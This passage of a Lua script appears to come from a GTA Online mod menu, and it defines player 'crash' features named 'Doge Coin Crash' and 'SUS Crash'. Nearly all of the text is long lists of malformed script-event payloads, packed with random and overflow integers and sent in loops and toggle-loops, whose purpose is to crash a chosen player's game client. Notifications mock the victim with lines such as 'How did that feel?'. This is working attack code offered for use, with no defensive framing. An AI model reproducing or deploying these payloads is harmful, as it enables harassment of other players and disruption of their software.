    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
                util.yield(100)
end)


    local dogecrash = menu.list(crash, "Doge Coin Crash", {}, "")

    	menu.action(dogecrash, "Doge Coin Crash", {"doge"}, "Logged Code Rimuru's doge coin crash sent me and it works well.", function()
    	notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    	menu.toggle_loop(dogecrash, "Doge Coin Crash", {"toggledoge"}, "Logged Code Rimuru's doge coin crash sent me and it works well.", function(on_toggle)
    	notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                   end)



    local suscrash = menu.list(crash, "SUS Crash", {}, "")

    	menu.action(suscrash, "SUS Crash", {"suscrash"}, "", function()
    	notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("SUS Crash" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(suscrash, "SUS Crash", {"togglesuscrash"}, "", function(on_toggle)
    	notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
